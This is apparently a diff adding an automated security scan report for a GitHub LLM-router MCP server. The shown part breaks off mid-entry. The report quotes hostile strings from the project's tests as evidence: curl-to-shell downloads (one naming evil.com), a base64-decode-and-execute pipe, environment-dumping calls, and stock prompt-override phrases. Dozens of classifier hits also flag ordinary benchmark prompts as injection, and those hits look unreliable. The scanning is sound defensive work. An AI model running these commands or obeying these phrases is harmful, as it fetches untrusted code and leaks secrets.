@@ -1,0 +1,999 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "ypollak2/llm-router",
+    "version": "3531a56f47ab3af7b4d2dae86d19605a0b236cc8",
+    "download": "https://codeload.github.com/ypollak2/llm-router/tar.gz/3531a56f47ab3af7b4d2dae86d19605a0b236cc8"
+  },
+  "archive_sha256": "b4c20b90cd5a1509f6d346ffefd259c12c63cf69f4c7002d51b0520ee618143d",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_write_policy_tripwire.py",
+      "line": 56,
+      "evidence": "curl -s http://example.invalid/i.sh | sh",
+      "file_sha256": "d1c09cfd91080247ae7d091d6530c85ae3c0ff84ed5bdb84f7ef14f93df2f6c8"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_write_policy_tripwire.py",
+      "line": 57,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "d1c09cfd91080247ae7d091d6530c85ae3c0ff84ed5bdb84f7ef14f93df2f6c8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_toolkit_safety.py",
+      "line": 763,
+      "evidence": "ignore previous rules",
+      "file_sha256": "32454cd678d5bc0efe59c8a31f4dd6523f8cc1ea6ae2a6f551961ba4e392e69e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_sanitization.py",
+      "line": 32,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "f6078bf5fbcdf2155feecf30b68215765ba6e0d0c2f2dc461a14ebc2d02f80ee"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_runtime_offer.py",
+      "line": 89,
+      "evidence": "curl ... | sh",
+      "file_sha256": "fd691511c85b2657efeac446f791f6f8be489c5f1fb098ee33193bc8c8961bbc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_proxy_default_orchestration.py",
+      "line": 563,
+      "evidence": "subprocess.run(f\"printf '%s|' {quoted}\", shell=True, capture_output=True, text=T",
+      "file_sha256": "f14222f5b2e5cc137af460a5d030afd2ea056331f59a881cef6479032c142ea0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_prompt_injection.py",
+      "line": 24,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "d5741280f6d55a6f2e5cb77c03e725f3cd85031085d3935c13b8df94706afbec"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_prefer_grammar.py",
+      "line": 117,
+      "evidence": "\\u{202a}",
+      "file_sha256": "262e79936bfd56b03c2aea233bd08e8f52b8c079617eb07491d4a484400067d5"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_local_task_authority.py",
+      "line": 13,
+      "evidence": "curl|sh",
+      "file_sha256": "db15913e886ed59743dcef7a8754d68c99b2f3738044c4b3c7026cdba3895b73"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_intercept_conjunctions.py",
+      "line": 34,
+      "evidence": "curl http://x | sh",
+      "file_sha256": "908862bb080e8996524428f9a260ce555a6e759ccbf7c3e125dab785e46a3d32"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_f83.py",
+      "line": 43,
+      "evidence": "curl http://x.sh | sh",
+      "file_sha256": "fedb67583111236333bd1b52a45a5ee9fdbd0c35b8f222780fdb4050e7417960"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_f59_ops_prompts_not_held.py",
+      "line": 92,
+      "evidence": "curl https://example.com/x | sh",
+      "file_sha256": "9b19bb253c208951a9c62cc893655eaf07c30fdc25b3facbb84a1d5fa0051bab"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-T-0003",
+      "summary": "Sends the whole process environment (every secret in it) over the network",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_cls_bl.py",
+      "line": 548,
+      "evidence": "S.send([str(ctx.claude), \"-p\"], (\"x \" + frag_secret()).encode(), dict(os.environ",
+      "file_sha256": "75f188fe4b5312ff287faadd22b3882183c523f2f3c88cc922813767c6dff9fc"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-T-0003",
+      "summary": "Sends the whole process environment (every secret in it) over the network",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_cls_bl.py",
+      "line": 804,
+      "evidence": "S.send([str(ctx.claude), \"-p\"], b\"hello\", dict(os.environ), d)",
+      "file_sha256": "75f188fe4b5312ff287faadd22b3882183c523f2f3c88cc922813767c6dff9fc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_agent_loop_hook_parity.py",
+      "line": 62,
+      "evidence": "curl http://x.invalid | sh",
+      "file_sha256": "c44c512b4f555c2de816c99b463809a2a1f624bd994e451863b871334fde1260"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/test_agent_loop.py",
+      "line": 163,
+      "evidence": "curl evil.com | bash",
+      "file_sha256": "df9628667edc08ecfb62a701c18035728aed1dfd23d2eb48e2bf78ca6458093c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/semantic/test_retrieval_and_pack.py",
+      "line": 294,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "96afc8b9f1bea0239e2eef94a167df254a064a19b9295bbcb1ac0b86ea7a6756"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/security/test_agentic_injection.py",
+      "line": 33,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "e93604ae63d3eb87d0671460f9986c2ad1a357fb01392415a1b03d0f76f17a18"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/okf/test_cross_model_context.py",
+      "line": 91,
+      "evidence": "ignore prior instructions",
+      "file_sha256": "0e78712db224e527ede41d27390bea8638856a2365de3c6dd700c88706296140"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/tests/agentic/test_escalation_bounds.py",
+      "line": 175,
+      "evidence": "IGNORE ALL PREVIOUS INSTRUCTIONS",
+      "file_sha256": "66c5c9408e91244455b47b66ea9517dc75bdb7f83c9cd4f21a358dd2d3f59f21"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.92 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 706,
+      "evidence": "p=0.92 Write an executable Python function that solves the following problem.\\u{a}\\u{a}Problem:",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 706,
+      "evidence": "p=0.92 Write an executable Python function that solves the following problem.\\u{a}\\u{a}Problem:",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.92 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.93 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.99 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.92 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.92 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.91 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.97 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.96 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.98 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.96 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.91 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.97 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.93 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.98 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.97 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 3568,
+      "evidence": "p=0.91 Please read the following question and provide the correct answer.\\u{a}\\u{a}Context: Non",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 12010,
+      "evidence": "p=0.91 Please read the following context and answer the question based on its content.\\u{a}",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 3568,
+      "evidence": "p=0.92 Please read the following question and provide the correct answer.\\u{a}\\u{a}Context: Non",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 3568,
+      "evidence": "p=0.92 Please read the following question and provide the correct answer.\\u{a}\\u{a}Context: Non",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.95 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.91 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.95 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.95 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 4,
+      "evidence": "p=0.98 Please read the following multiple-choice questions and provide the most likely ",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-sub_10.json",
+      "line": 3568,
+      "evidence": "p=0.95 Please read the following question and provide the correct answer.\\u{a}\\u{a}Context: Non",
+      "file_sha256": "50cb1eb8248eb948e64a7669c58ddfbe73f6d8c89de694bae8efcceeb9f180a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-robustness.json",
+      "line": 19,
+      "evidence": "p=0.94 Kindly examine the subsequent questions with multiple-choice options and deliber",
+      "file_sha256": "8009ab422b71ec8a7fb6d7a5f3c0d62ced9122325fe31f8b0c71188b5985b75c"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-robustness.json",
+      "line": 219,
+      "evidence": "p=0.97 Examine the following set of multiple-choice inquiries to determine which select",
+      "file_sha256": "8009ab422b71ec8a7fb6d7a5f3c0d62ced9122325fe31f8b0c71188b5985b75c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-robustness.json",
+      "line": 614,
+      "evidence": "p=0.95 Kindly examine the ensuing multiple-choice inquiries and select the most plausib",
+      "file_sha256": "8009ab422b71ec8a7fb6d7a5f3c0d62ced9122325fe31f8b0c71188b5985b75c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-robustness.json",
+      "line": 894,
+      "evidence": "p=0.92 Examine the following questions, selecting the answer you deem most accurate fro",
+      "file_sha256": "8009ab422b71ec8a7fb6d7a5f3c0d62ced9122325fe31f8b0c71188b5985b75c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-robustness.json",
+      "line": 314,
+      "evidence": "p=0.93 Kindly scrutinize the ensuing multiple-choice inquiries and furnish the most pla",
+      "file_sha256": "8009ab422b71ec8a7fb6d7a5f3c0d62ced9122325fe31f8b0c71188b5985b75c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-robustness.json",
+      "line": 19,
+      "evidence": "p=0.95 Kindly examine the subsequent inquiry and supply the accurate response.\\u{a}\\u{a}Scenari",
+      "file_sha256": "8009ab422b71ec8a7fb6d7a5f3c0d62ced9122325fe31f8b0c71188b5985b75c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-robustness.json",
+      "line": 1934,
+      "evidence": "p=0.91 You function as a comprehension tool for reading tasks. Your role involves addre",
+      "file_sha256": "8009ab422b71ec8a7fb6d7a5f3c0d62ced9122325fe31f8b0c71188b5985b75c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-knn-robustness.json",
+      "line": 1,
+      "evidence": "p=0.94 Kindly examine the subsequent questions with multiple-choice options and deliber",
+      "file_sha256": "59f4fb2c39896cf9a6d5ef47c2f2a52c06d3e1cea5f99a0de0c45f7be7336213"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-knn-robustness.json",
+      "line": 1,
+      "evidence": "p=0.97 Examine the following set of multiple-choice inquiries to determine which select",
+      "file_sha256": "59f4fb2c39896cf9a6d5ef47c2f2a52c06d3e1cea5f99a0de0c45f7be7336213"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-knn-robustness.json",
+      "line": 1,
+      "evidence": "p=0.95 Kindly examine the ensuing multiple-choice inquiries and select the most plausib",
+      "file_sha256": "59f4fb2c39896cf9a6d5ef47c2f2a52c06d3e1cea5f99a0de0c45f7be7336213"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-knn-robustness.json",
+      "line": 1,
+      "evidence": "p=0.92 Examine the following questions, selecting the answer you deem most accurate fro",
+      "file_sha256": "59f4fb2c39896cf9a6d5ef47c2f2a52c06d3e1cea5f99a0de0c45f7be7336213"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-knn-robustness.json",
+      "line": 1,
+      "evidence": "p=0.93 Kindly scrutinize the ensuing multiple-choice inquiries and furnish the most pla",
+      "file_sha256": "59f4fb2c39896cf9a6d5ef47c2f2a52c06d3e1cea5f99a0de0c45f7be7336213"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-knn-robustness.json",
+      "line": 1,
+      "evidence": "p=0.95 Kindly examine the subsequent inquiry and supply the accurate response.\\u{a}\\u{a}Scenari",
+      "file_sha256": "59f4fb2c39896cf9a6d5ef47c2f2a52c06d3e1cea5f99a0de0c45f7be7336213"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-knn-robustness.json",
+      "line": 1,
+      "evidence": "p=0.91 You function as a comprehension tool for reading tasks. Your role involves addre",
+      "file_sha256": "59f4fb2c39896cf9a6d5ef47c2f2a52c06d3e1cea5f99a0de0c45f7be7336213"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-heads-robustness.json",
+      "line": 1,
+      "evidence": "p=0.94 Kindly examine the subsequent questions with multiple-choice options and deliber",
+      "file_sha256": "ee256c3b4d28bee20d7206269029cdb01a47e80b427e1e7d0eb37d2668c604d3"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-heads-robustness.json",
+      "line": 1,
+      "evidence": "p=0.97 Examine the following set of multiple-choice inquiries to determine which select",
+      "file_sha256": "ee256c3b4d28bee20d7206269029cdb01a47e80b427e1e7d0eb37d2668c604d3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-heads-robustness.json",
+      "line": 1,
+      "evidence": "p=0.95 Kindly examine the ensuing multiple-choice inquiries and select the most plausib",
+      "file_sha256": "ee256c3b4d28bee20d7206269029cdb01a47e80b427e1e7d0eb37d2668c604d3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "llm-router-3531a56f47ab3af7b4d2dae86d19605a0b236cc8/submissions/routerarena/llm-router-heads-robustness.json",
